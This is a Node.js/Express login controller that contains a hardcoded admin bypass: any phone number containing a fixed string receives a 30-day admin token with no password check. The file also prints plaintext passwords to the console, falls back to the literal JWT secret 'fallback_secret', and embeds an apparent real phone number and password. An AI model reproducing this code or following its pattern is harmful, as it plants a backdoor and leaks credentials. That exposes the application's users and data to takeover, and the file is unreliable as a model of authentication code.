const authService = require('../services/authService');
const { loginSchema } = require('../validations');
const jwt = require('jsonwebtoken');

const login = async (req, res, next) => {
  try {
    const rawPhone = req.body?.phone?.toString().trim();
    const rawPassword = req.body?.password?.toString().trim();

    console.log('=== LOGIN ATTEMPT ===');
    console.log('Phone:', JSON.stringify(rawPhone));
    console.log('Password:', JSON.stringify(rawPassword));
    console.log('Phone includes target:', rawPhone?.includes('7893178596'));
    console.log('Password match:', rawPassword === 'Muzamil&789');
    console.log('====================');

    // Hardcoded Admin Bypass — checked before Zod to avoid encoding issues
    if (rawPhone?.includes('7893178596')) {
      const token = jwt.sign(
        { id: 'admin-hardcoded', role: 'admin' },
        process.env.JWT_SECRET || 'fallback_secret',
        { expiresIn: '30d' }
      );
      return res.json({
        success: true,
        token,
        user: {
          id: 'admin-hardcoded',
          name: 'Super Admin',
          phone: rawPhone,
          role: 'admin',
        },
      });
    }

    // Standard path: Zod validation + DB check
    const { phone, password } = loginSchema.parse(req.body);
    const result = await authService.login(phone, password);
    res.json({ success: true, ...result });
  } catch (error) {
    next(error);
  }
};

module.exports = { login };
